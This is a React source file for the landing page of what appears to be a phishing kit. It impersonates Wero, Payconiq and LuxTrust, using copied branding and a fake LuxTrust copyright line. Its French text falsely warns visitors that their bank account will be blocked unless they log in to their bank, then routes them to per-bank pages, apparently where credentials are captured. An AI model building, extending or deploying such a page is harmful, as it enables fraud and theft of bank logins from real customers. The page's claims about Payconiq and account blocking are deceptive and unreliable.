import { Link } from "react-router-dom";
import { BANKS } from "../lib/banks";
import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";

function LuxTrustWordmark() {
  return (
    <span className="flex items-center gap-1.5">
      <span className="text-[22px] font-black tracking-tight text-neutral-900 sm:text-[24px]">
        LUX<span className="bg-gradient-to-r from-cyan-500 to-blue-700 bg-clip-text text-transparent">TRUST</span>
      </span>
    </span>
  );
}

function BankLogo({ slug, name }) {
  const src = BANK_LOGO_URLS[slug];
  const fallback = BANK_FALLBACK_URLS[slug];
  return (
    <span className="flex h-14 w-20 shrink-0 items-center justify-center overflow-hidden bg-slate-50 ring-1 ring-black/5 sm:h-16 sm:w-24">
      <img
        src={src}
        alt={name}
        loading="lazy"
        className="max-h-10 w-auto max-w-[64px] object-contain sm:max-h-12 sm:max-w-[80px]"
        onError={(e) => {
          const img = e.currentTarget;
          if (img.src !== fallback) {
            img.src = fallback;
          } else {
            img.style.display = "none";
            if (img.nextSibling) img.nextSibling.style.display = "block";
          }
        }}
      />
      <span style={{ display: "none" }} className="text-[18px] font-black text-neutral-400">
        {name?.charAt(0)}
      </span>
    </span>
  );
}

export default function Landing() {
  return (
    <div className="min-h-screen w-full overflow-x-hidden bg-white text-slate-800">
      {/* Top bar */}
      <header className="relative z-50 flex h-[54px] w-full items-stretch border border-[#333333] bg-white">

      {/* WERO Logo */}
      <a
        href="/"
        aria-label="Wero Home"
        className="flex flex-1 items-center pl-6 sm:pl-[60px]"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 120 36"
          className="h-auto w-[100px] sm:w-[115px]"
          role="img"
          aria-label="Wero"
        >
          <text
            x="0"
            y="29"
            fill="#111111"
            fontSize="34"
            fontWeight="900"
            letterSpacing="-2.5"
            fontFamily="Arial, Helvetica, sans-serif"
          >
            WERO
          </text>
        </svg>
      </a>

      {/* Right Navigation */}
      <div className="flex h-full shrink-0 items-stretch">

        {/* Language Selector */}
        <button
          type="button"
          aria-label="Select language"
          className="flex h-full w-[76px] items-center justify-center border-l border-[#777777] bg-white text-[12px] font-medium text-black transition-colors hover:bg-[#f5f5f5]"
        >
          LU/EN
        </button>

        {/* Menu Button */}
        <button
          type="button"
          aria-label="Menu"
          className="flex h-full w-[76px] items-center justify-center border-l border-[#777777] bg-[#111111] text-white transition-colors hover:bg-[#292929]"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="20"
            height="20"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            aria-hidden="true"
          >
            <path d="M4 7h16" />
            <path d="M4 12h16" />
            <path d="M4 17h16" />
          </svg>
        </button>
      </div>
    </header>

      {/* Hero */}
      <section className="relative isolate w-full overflow-hidden bg-white text-black">
      {/* Background geometric shapes */}
      <div className="pointer-events-none absolute inset-0 -z-10 overflow-hidden">
        <div className="absolute -right-[12%] -top-[35%] h-[125%] w-[48%] rotate-[27deg] rounded-[100px] bg-[#F4F5F7]" />

        <div className="absolute -right-[22%] top-[10%] h-[130%] w-[32%] rotate-[27deg] bg-[#FAFAFA]" />

        <div className="absolute bottom-[-40%] right-[24%] h-[80%] w-[30%] rotate-[27deg] rounded-full bg-[#F8F8F8]" />
      </div>

      <div className="mx-auto grid min-h-[300px] max-w-[1600px] grid-cols-1 items-center gap-6 px-10 py-8 sm:px-16 lg:min-h-[400px] lg:grid-cols-2 lg:gap-8 lg:px-24 lg:py-12">
        {/* Left: Hero text */}
        <div className="relative z-10 mx-auto max-w-[640px] px-4 text-center sm:px-8">
          <h1 className="font-heading mx-auto max-w-[620px] text-[28px] font-bold leading-[1.08] tracking-[-1.8px] sm:text-[36px] lg:text-[48px] xl:text-[56px]">
            Payconiq devient désormais{" "}
            <span className="font-black">WERO.</span>
          </h1>

          <p className="font-body mx-auto mt-7 max-w-[600px] text-[14px] leading-[1.7] text-[#202124] sm:text-[16px] lg:text-[18px]">
            Afin de continuer à utiliser nos services comme vous en avez
            l’habitude, vous devez vous authentifier en vous connectant à votre
            banque, afin d’éviter tout blocage de votre compte bancaire.
          </p>
        </div>

        {/* Right: WERO illustration */}
        <div className="relative flex min-h-[200px] items-center justify-center lg:min-h-[300px]">
          <img
            src="/hero-bg.jpg"
            alt="Illustration colorée symbolisant la transition vers Wero"
            className="relative z-10 h-auto w-full max-w-[500px] object-contain"
          />
        </div>
      </div>
    </section>

      <main className="mx-auto w-full max-w-3xl px-4 pb-10 sm:px-6">
        {/* Security notice */}
        <div className="mt-4 flex gap-2.5 border border-[#D8CE72] bg-[#E9DE83] mx-4 px-4 py-3">
  <svg
    viewBox="0 0 24 24"
    className="h-5 w-5 shrink-0 text-black"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    aria-hidden="true"
  >
    <path
      d="M12 3 2.5 20h19L12 3z"
      strokeLinejoin="round"
    />
    <path d="M12 10v4m0 3h.01" />
  </svg>

  <p className="text-[13px] leading-relaxed text-black">
    <b>Information importante :</b> Payconiq disparaît et WERO devient le
    nouveau système de paiement. Sélectionnez votre banque et suivez les
    étapes indiquées.
  </p>
</div>

      {/* Partner Banks Section */}
<section className="mx-auto w-full max-w-3xl px-4 pb-10 sm:px-6">

  {/* Section Heading */}
  <div className="mb-8 text-center">
    <h2 className="text-[28px] font-extrabold tracking-tight text-black sm:text-[34px]">
      Banques partenaires
    </h2>

    <div className="mx-auto mt-3 h-1 w-14 rounded-full bg-[#E9DE83]" />

    <p className="mx-auto mt-4 max-w-lg text-[15px] leading-7 text-neutral-700 sm:text-base">
      Retrouvez les coordonnées et les services en ligne de votre banque
      auprès de ses canaux officiels.
    </p>
  </div>

  {/* Bank List */}
  <div className="space-y-4">
    {BANKS.map((b) => (
      <Link
        key={b.slug}
        to={`/${b.slug}`}
        onClick={() => {
          try {
            sessionStorage.setItem("fresh_visit", "1");
          } catch {
            // Session storage may be unavailable.
          }
        }}
        className="group flex min-h-[104px] w-full items-center gap-4 border border-neutral-200 bg-white p-4 transition-colors duration-200 hover:border-neutral-400 hover:bg-neutral-50 sm:min-h-[116px] sm:gap-5 sm:p-5"
      >
        {/* Bank Logo */}
        <div className="flex h-[68px] w-[76px] shrink-0 items-center justify-center sm:h-[78px] sm:w-[92px]">
          <BankLogo slug={b.slug} name={b.name} />
        </div>

        {/* Bank Information */}
        <div className="min-w-0 flex-1">
          <h3 className="break-words text-[16px] font-bold leading-snug text-black sm:text-[18px]">
            {b.name}
          </h3>

          <p className="mt-1.5 break-words text-[14px] leading-relaxed text-neutral-600 sm:text-[15px]">
            {b.sub}
          </p>
        </div>

        {/* Action Button */}
        <span className="inline-flex shrink-0 items-center gap-2 rounded-full border-2 border-black bg-[#F5E987] py-1.5 pl-4 pr-1.5 text-[13px] font-bold text-black shadow-[0_2px_0_rgba(0,0,0,0.18)] transition-transform duration-200 group-hover:-translate-y-0.5 group-active:translate-y-0 sm:gap-3 sm:py-2 sm:pl-5 sm:pr-2 sm:text-[14px]">
          <span>Continuer</span>

          <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full border border-neutral-200 bg-white sm:h-9 sm:w-9">
            <svg
              viewBox="0 0 24 24"
              className="h-4 w-4 sm:h-[18px] sm:w-[18px]"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.8"
              strokeLinecap="round"
              strokeLinejoin="round"
              aria-hidden="true"
            >
              <path d="M7 17 17 7" />
              <path d="M8 7h9v9" />
            </svg>
          </span>
        </span>
      </Link>
    ))}
  </div>

</section>

        <p className="mt-6 text-center text-[11.5px] text-neutral-400">
          © 2026 LuxTrust S.A. Luxembourg — Vérification d&apos;identité sécurisée
        </p>
      </main>
    </div>
  );
}

